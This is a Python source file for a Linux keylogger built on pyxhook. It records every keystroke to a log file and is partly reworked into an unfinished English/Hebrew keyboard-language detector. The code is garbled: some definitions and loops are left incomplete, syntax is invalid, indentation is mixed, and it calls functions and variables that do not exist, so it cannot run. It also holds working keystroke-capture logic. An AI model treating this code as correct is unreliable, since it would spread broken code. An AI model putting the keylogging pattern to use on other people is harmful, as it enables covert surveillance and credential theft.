"""
Copyright (c) 2015, Aman Deep
All rights reserved.


A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when grave key(`) is pressed

grave key is found below Esc key
"""

import pyxhook
#change this to your log file's path
log_file='./log'


class Lang(name, first, last):
	def __init__(self, name, first, last):
		self.name = name
		self.first = first
		self.last = last

class String(text, lang):
	def __init__(self, text = "", lang = "")
		self.text = text
		self.lang = lang


def is_en(c):
	if ((c >= 'a' and c <= 'z') or (c >= 'A' and c <= 'Z')):
		return (1)


def is_he(c):
	if (event.key >= 'א' and event.key <= 'ת'):
		return (1)

def is_lang(

Languages = [
	Lang("en", "a", "z"),
	Lang("he", "א", "ת")
]
Islang = [is_en, is_he]

def is_letter(c):
	for lang in Languages
		if(is_en

#this function is called everytime a key is pressed.
def OnKeyPress(event, word):
  fob=open(log_file,'a')
	c = event.key
	if (is_letter(c)):
		word.string += event.key
	else:
		if(detect_lang(word.string) != "" and detect_lang(word.string) != word.lang)
			print("Ctrl A, print out the whole string in the correct language")
		word.string = ""
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==96: #96 is the ascii value of the grave key (`)
    fob.close()
    new_hook.cancel()

global T = []
for lang in Languages:
	T.append(String("", lang.name))

global word = String("", lang.name)

#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
